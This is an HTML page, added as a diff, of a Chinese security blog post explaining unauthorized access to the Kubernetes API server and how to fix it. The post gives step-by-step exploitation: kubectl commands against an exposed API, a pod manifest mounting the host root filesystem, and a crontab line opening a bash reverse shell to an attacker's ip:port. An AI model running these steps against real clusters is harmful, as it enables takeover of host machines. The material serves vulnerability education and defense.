@@ -1,0 +1,295 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>Kubernetes Api Server 未授权访问漏洞 | Brickの小黑屋</title>
+
+<link rel="shortcut icon" href="https://brick713.github.io/favicon.ico?v=1749001692545">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://brick713.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-73319140-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-73319140-1');
+</script>
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Brickの小黑屋
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1749001692545"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Kubernetes Api Server 未授权访问漏洞
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2018-12-05 ·
+                    </time>
+                    
+                        <a href="https://brick713.github.io/WgbtwK_Qkc/" class="post-tags">
+                            # 漏洞分析
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="0x00-漏洞原因">0x00 漏洞原因</h1>
+<p>Kubernetes 的服务在正常启动后会开启两个端口：</p>
+<ol>
+<li>Localhost Port （默认8080）</li>
+<li>Secure Port （默认6443）</li>
+</ol>
+<p>这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2018/12/05/5c07dec609ff5.png" alt="Web 页面" loading="lazy"></figure>
+<p>正常情况下 Api Server 是有权限控制的，分三种：</p>
+<ol>
+<li>Authentication</li>
+<li>Authorization</li>
+<li>AdmissionControl</li>
+</ol>
+<p>如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限，甚至通过创建自定义的容器去获取宿主机的权限。</p>
+<h1 id="0x01-漏洞利用">0x01 漏洞利用</h1>
+<p>利用方式按严重程度来说分两种，一种是直接通过利用 kubectl 客户端调用 Secure Port 接口去控制已经创建好的容器。另外一种利用方法就是通过创建一个自定义的容器将系统根目录的文件挂在到/mnt目录，通过修改/mnt/etc/crontab 来影响宿主机的 crontab，获取一个反弹 Shell 拿到宿主机的权限。先说第一种方式。</p>
+<p>首先，通过下面命令，去发现已经存在的容器</p>
+<pre><code>kubectl -s ip:port  get pods
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2018/12/05/5c07e27b68f05.png" alt="发现的容器" loading="lazy"></figure>
+<p>然后直接连接这个容器获取 Shell。</p>
+<pre><code>kubectl -s ip:port  --namespace=default exec -it dockername bash
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2018/12/06/5c07f8c667de8.png" alt="获取容器权限" loading="lazy"></figure>
+<p>这样就达到了控制容器的目的，但是容器的权限本身是不稳定的，如果宿主机本身的内核有问题的话，可以利用脏牛漏洞进行提权，获取宿主机的权限。具体可以参考：</p>
+<p><a href="https://github.com/scumjr/dirtycow-vdso">PoC for Dirty COW (CVE-2016-5195)</a><br>
+<a href="https://github.com/gebl/dirtycow-docker-vdso">DDirtycow-docker-vdso</a></p>
+<p>第二种方式就比较厉害了，利用成功后造成的危害也最大。</p>
+<p>首先我们根据官方的规范新建一个标准文件 <code>myapp.yaml</code> ,当然也可以使用 json 格式的。</p>
+<pre><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: myapp
+spec:
+  containers:
+  - image: nginx
+    name: container
+    volumeMounts:
+    - mountPath: /mnt
+      name: test-volume
+  volumes:
+  - name: test-volume
+    hostPath:
+      path: /
+</code></pre>
+<p>其中的 image 可以更换，最好使用基础镜像。</p>
+<p>然后我们可以通过两种方式提交我们创建容器的请求，一种是通过他的 Web 页面（也就是默认的8080端口）</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2018/12/05/5c07e697f2044.png" alt="Web 端方式提交" loading="lazy"></figure>
+<p>另外我们也可以通过他的另外的接口，通过 kubectl 客户端进行任务的提交。</p>
+<pre><code>kubectl -s  ip:port create -f yourfile
+</code></pre>
+<p>这里如果出现<code>Error from server (NotFound): the server could not find the requested resource</code>报错，可能是因为你的 kubectl 客户端和 kubernetes 的 server 端版本不相同导致的，一定要确保版本相同。</p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2018/12/05/5c07edbf2b85e.png" alt="版本确认" loading="lazy"></figure>
+<p>提交成功后，我们用之前命令获取容器的 bash，然后向容器的 <code>/mnt/etc/crontab</code> 写入反弹 shell 的定时任务，因为创建容器时把宿主机的根目录挂载到了容器的/mnt 目录下，所以可以直接影响到宿主机的 crontab。</p>
+<pre><code>echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab
+</code></pre>
+<p>接下来就是见证奇迹的时刻，耐心的等待你就能拿到 Shell 了，验证之后可以确认是宿主机的权限，而不是容器的权限</p>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2018/12/05/5c07e92f66a77.png" alt="获取宿主机权限" loading="lazy"></figure>
+<h1 id="0x01-漏洞修复">0x01 漏洞修复</h1>
+<p>在使用 kubernetes 的时候我们一定要进行身份的校验，K8S 的 APi 其实有非常严格的认证和授权</p>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2018/12/05/5c07ea3d72caa.png" alt="校验认证流程" loading="lazy"></figure>
+<p>最简单的是在 Authentication 增加静态的 password，或者 token，可以的话关闭 Web 端口的服务，保持最小化原则，避免安全风险的产生，可以参考 <a href="https://kubernetes.io/docs/reference/access-authn-authz/authentication/#static-password-file">官方文档</a></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-er/" class="post-title gt-a-link">
+                    移动端安全修炼（二）
+                </a>
+            </div>
+        
+
+        
+            <span id="/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong//" class="leancloud_visitors" data-flag-title="Kubernetes Api Server 未授权访问漏洞">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'BPVmDnJ3m7hNIrMMJze0YXAt-gzGzoHsz',
+		appKey: '9VgKRlxWNsjLGNJsxQycFcRE',
+		avatar: 'wavatar',
+		pageSize: 10,
+		recordIp: true,
+		placeholder: '',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">Home is Where Your Wifi Connects Automatically</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/brick713" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://twitter.com/YuppiesBrick" target="_blank">
+                    <i class="fab fa-twitter gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://weibo.com/brick123" target="_blank">
+                    <i class="fab fa-weibo gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://www.zhihu.com/people/brick713" target="_blank">
+                    <i class="fab fa-zhihu gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        May The Force Be With You
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://brick713.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
